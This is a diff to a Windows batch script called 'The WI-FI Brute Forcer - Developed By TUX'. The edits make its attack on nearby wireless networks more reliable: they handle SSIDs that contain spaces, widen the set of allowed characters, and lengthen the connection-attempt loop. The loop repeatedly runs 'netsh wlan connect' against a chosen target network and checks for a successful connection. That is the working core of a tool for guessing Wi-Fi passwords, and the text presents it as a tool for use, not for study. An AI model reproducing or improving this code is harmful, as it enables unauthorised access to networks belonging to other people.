@@ -1,5 +1,5 @@
 @echo off
-	set allowed_char_list="ABCDEFGHIJKLMNOPRSTUVYZWXQabcdefghijklmnoprstuvyzwxq0123456789-_"
+	set allowed_char_list="ABCDEFGHIJKLMNOPRSTUVYZWXQabcdefghijklmnoprstuvyzwxq0123456789!@#$%^&*()-_"
 	cd BF_Files
 	title The WI-FI Brute Forcer - Developed By TUX
 	set /a attempt=1
@@ -171,7 +171,7 @@
 	if !mainmenuchoice!==wifiscan (
 		del infogate.xml
 		call :wifiscan
-		call :exporter !targetwifi!
+		call :exporter "!targetwifi!"
 		goto :main
 	)
 	
@@ -261,38 +261,21 @@
 		echo  !attempt!
 		echo  [==================================================]
 		echo   Current State:
-		netsh wlan connect name=!targetwifi! interface="!interface_id!" >nul
-
-	
+		netsh wlan connect name="!targetwifi!" interface="!interface_id!" >nul	
 		
-	
-		
-		for /l %%a in ( 1, 1, 20) do (
+		for /l %%a in ( 1, 1, 30) do (
 			call :find_connection_state
-				if !interface_state!==connecting (
+			if !interface_state!==connecting (
 				del infogate.xml
 				del attempt.xml
 				goto :show_result
 			)
-				if !interface_state!==connected (
+			if !interface_state!==connected (
 				del infogate.xml
 				del attempt.xml
 				goto :show_result
 			)
-		
 		)
-		
-		
-	
-
-	
-	
-	
-	
-	
-	
-	
-	
 		
 		set /a attempt=!attempt!+1
 		del attempt.xml
@@ -389,15 +372,26 @@
 		echo.
 		echo  Low Signal Strength WI-FIs are not recommended
 		echo.
-		for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
-
-		
+		for /f "tokens=1-20" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!"') do (
+			
 			if %%a==SSID (
-				set /a keynumber=!keynumber! + 1
 				set current_ssid=%%d
 
-				call :character_finder_2 "!current_ssid!"
+				for %%T in (%%e %%f %%g %%h %%i %%j %%k %%l %%m %%n %%o %%p %%q %%r %%s %%t) do (
+					if not "%%T"=="" (
+						set current_ssid=!current_ssid! %%T
+					) else (
+						goto :eof
+					)
+				)
 
+				if "!current_ssid!"=="" (
+					set "current_ssid=Hidden_Network"
+				)
+
+				set /a keynumber=!keynumber! + 1
+
+				call :character_finder_2 "!current_ssid!"
 			)
 
 			if %%a==Signal (
@@ -482,18 +476,17 @@
 			goto :skip_disconnection
 		)
 		
-		for /f "tokens=1-5" %%a in ( wifilist.txt ) do (
+		for /f "tokens=1-20" %%a in ( wifilist.txt ) do (
 		
 		if %%a==!choice! (
 				set temp_signal_strength=%%e
 				set signal_strength=!temp_signal_strength:~0,-1!
 				if %%c==Unsupported (
 					call colorchar.exe /0c " This SSID is unsupported..."
-					timeout /t 3 >nul
+					timeout /t 1 >nul
 					cls
 					goto :skip_disconnection
 				)else (
-					
 					if !signal_strength! lss 50 (
 						echo.
 						call colorchar.exe /0c " Low signal[!signal_strength!] strengths are not recommended."
@@ -511,6 +504,14 @@
 							)
 							if !choice!==Y (
 								set targetwifi=%%c
+								for %%T in (%%d %%e %%f %%g %%h %%i %%j %%k %%l %%m %%n %%o %%p %%q %%r %%s %%t) do (
+									if not "%%T"=="-" (
+										set targetwifi=!targetwifi! %%T
+									) else (
+										goto :eof
+									)
+								)
+
 								goto :skip_target_wifi
 							)
 							call colorchar.exe /0c " Invalid input"
@@ -522,9 +523,15 @@
 							
 					)
 					
-				
-					
 					set targetwifi=%%c
+					for %%T in (%%d %%e %%f %%g %%h %%i %%j %%k %%l %%m %%n %%o %%p %%q %%r %%s %%t) do (
+						if not "%%T"=="-" (
+							set targetwifi=!targetwifi! %%T
+						) else (
+							goto :eof
+						)
+					)
+					
 					:skip_target_wifi
 					echo Test >nul
 					
@@ -559,7 +566,7 @@
 	:exporter
 		for /f "tokens=*" %%a in ( importwifi.xml ) do (
 		set variable=%%a
-		echo !variable:changethistitle=%1!>>infogate.xml
+		echo !variable:changethistitle=%~1!>>infogate.xml
 	)
 	goto :eof
 	
@@ -586,11 +593,12 @@
 	:character_finder_2
 		set text_available=true
 		call :create_string check_name "%~1"
-		set /a check_name_length=!check_name_length!-1	
+		set /a check_name_length= !check_name_length! - 1
 		for /l %%a in ( 0,1,!check_name_length!) do (
 			set current_character=!check_name:~%%a,1!
 
 			call :character_finder "!allowed_char_list!" "!current_character!"	
+
 			if !character_found!==false (	
 				set text_available=false
 				goto :eof
@@ -606,16 +614,16 @@
 	
 	
 	:character_finder
-	set character_found=false
-	call :create_string string_find "%~1"
-	set /a string_find_length=!string_find_length! - 1
-	for /l %%a in ( 0, 1, !string_find_length! ) do (
-		set character=!string_find:~%%a,1!
-		if "!character!"=="%~2" (
-		set character_found=true
-		goto :eof
+		set character_found=false
+		call :create_string string_find "%~1"
+		set /a string_find_length=!string_find_length! - 1
+		for /l %%a in ( 0, 1, !string_find_length! ) do (
+			set character=!string_find:~%%a,1!
+			if "!character!"=="%~2" (
+			set character_found=true
+			goto :eof
+			)
 		)
-	)
 	goto :eof
 	
 	
@@ -625,22 +633,23 @@
 	
 	
 	:create_string
-		set /a takeaway=4
-		set string=%~2
-		echo %string%>var.txt
 		
-	for /f "useback tokens=*" %%a in ( '%string%' ) do (
-		if %string%==%%~a (
-			set /a takeaway=2
+		set /a takeaway=4
+		set "string=%~2"		
+		echo !string!>var.txt
+		
+		for /f "useback tokens=*" %%a in ( '!string!' ) do (
+			if "!string!"=="%%~a" (
+				set /a takeaway=2
+			)
+			set "string=%%~a"
 		)
-		set string=%%~a 
-	)
-		set %~1=%string%
-		for %%I in ( var.txt ) do (
-			set /a %~1_length=%%~zI - %takeaway%
-		)
-		del var.txt
-	goto :eof
+			set "%~1=!string!"
+			for %%I in ( var.txt ) do (
+				set /a %~1_length=%%~zI - %takeaway%
+			)
+			del var.txt
+		goto :eof
 	
 	
 	
@@ -666,16 +675,14 @@
 	for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L Name') do (
 		
 		
-		if %%c==Wi-Fi (	
+		if %%c==WiFi (	
 			if not "%%d"=="" (
 				set interface_index=%%d
 				set interface_!temp_interface_num_for_index!=WI-FI !interface_index!
-				set /a temp_interface_num_for_index=!temp_interface_num_for_index!+1
-				
-				
+				set /a temp_interface_num_for_index=!temp_interface_num_for_index!+1				
 				set /a interface_number=!interface_number!+1
 			)else (
-				set interface_1=WI-FI
+				set interface_1=%%c
 				set /a temp_interface_num_for_index=!temp_interface_num_for_index!+1
 				set /a interface_number=!interface_number!+1
 			)
@@ -697,7 +704,7 @@
 			set interface_!temp_interface_num_for_mac!_mac=%%d
 			set /a temp_interface_num_for_mac=!temp_interface_num_for_mac!+1
 		)
-	set temp_interface_num_for_mac=1
+		set temp_interface_num_for_mac=1
 	)
 	goto :eof	
 	
@@ -869,42 +876,38 @@
 		call colorchar.exe /02 " CONNECTED."
 		echo.
 		timeout /t 2 /nobreak>nul
-		)
-			
-	goto :eof
+		)	
+		goto :eof
+
 	:set_states
 		set interface_%1_state=%2
-	goto :eof
-	
-	
-	
+		goto :eof
 	
 	:set_states_2
-			if "!interface_id!"=="WI-FI" (
-				set interface_state=!interface_1_state!
-			)else (
-				echo !interface_id!>interface_id.txt
+		if "!interface_id!"=="WI-FI" (
+			set interface_state=!interface_1_state!
+		)else (
+			echo !interface_id!>interface_id.txt
 
-					
-					for /l %%a in ( 1, 1, 100) do (
+				
+				for /l %%a in ( 1, 1, 100) do (
 
-			
-						if "!interface_id!" equ "!interface_%%a!" (
-							set interface_state=!interface_%%a_state!
-						)
-						
-					)	
+		
+					if "!interface_id!" equ "!interface_%%a!" (
+						set interface_state=!interface_%%a_state!
+					)
 					
-					
-					
-				del interface_id.txt
-			)
-	goto :eof
+				)	
+				
+				
+				
+			del interface_id.txt
+		)
+		goto :eof
 	
 	:calc_percentage
-	set /a pass_percentage = (%~1*100)/%~2
-	
-	goto :eof
+		set /a pass_percentage = (%~1*100) / %~2
+		goto :eof
 
 	
 	
